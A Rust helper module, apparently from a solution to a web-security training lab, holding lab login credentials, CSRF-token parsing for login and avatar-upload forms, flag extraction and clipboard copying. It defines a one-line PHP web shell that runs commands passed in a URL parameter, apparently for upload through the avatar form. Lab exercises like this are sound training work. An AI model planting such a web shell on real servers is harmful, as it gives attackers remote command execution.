use arboard::Clipboard;
use clap::Parser;
use reqwest::blocking::{Client, ClientBuilder};
use scraper::{Html, Selector};
use std::sync::LazyLock;
use std::time::Duration;
use url::Url;

pub static USERNAME: &str = "wiener";
pub static PASSWORD: &str = "peter";
pub static WEBSHELL: &str = "<?php echo system($_GET['command']); ?>";

pub static HTTP_CLIENT: LazyLock<Client> = LazyLock::new(|| {
    // Initialising the reqwest blocking client
    ClientBuilder::new()
        .timeout(Duration::from_secs(10))
        .cookie_store(true)
        .build()
        .expect("[-] Failed to generate reqwest client")
});

pub static LOGIN_CSRF_TOKEN_SELECTOR: LazyLock<Selector> =
    LazyLock::new(|| Selector::parse("form input[name=csrf]").unwrap());
pub static MY_AVATAR_UPLOAD_CSRF_TOKEN_SELECTOR: LazyLock<Selector> =
    LazyLock::new(|| Selector::parse("form#avatar-upload-form input[name=csrf]").unwrap());

#[derive(Parser, Debug)]
pub struct Args {
    /// Your Lab Instance URL is Required
    #[arg(short, long, value_parser = parse_url)]
    pub lab_url: Url,
}

fn parse_url(s: &str) -> Result<Url, String> {
    Url::parse(s).map_err(|e| format!("[-] Invalid URL: {}", e))
}

pub fn generate_clap_parser() -> Args {
    Args::parse()
}

pub fn get_csrf_token(body: &str, selector: &Selector) -> String {
    // Parsing the HTML page with Scraper
    let document = Html::parse_document(body);

    // Using CSS Selector to find the element CSRF that contains the CSRF Token and
    // extracting the CSRF token value from the element attributes
    document
        .select(selector)
        .next()
        .and_then(|element_ref| element_ref.attr("value"))
        .map(|v| v.to_string())
        .expect("[-] CSRF Token Not Found")
}

pub fn get_flag(content: String) {
    // When I was trying the labs, the response contains the flag duplicated like this: <flag><flag>
    // To get the correct flag, simply split the string in half and compare the two halves.
    // If they are equal, keep only one half of the flag
    let mut flag: String = content;

    let half = &flag.len() / 2;

    if flag[..half] == flag[half..] {
        flag = flag[..half].to_string();
    }

    println!("[+] Flag: {}", flag);

    let mut clipboard: Clipboard = Clipboard::new().unwrap();

    clipboard
        .set_text(flag)
        .expect("[-] Failed to copy flag to clipboard");

    println!("[+] Flag copied to clipboard")
}
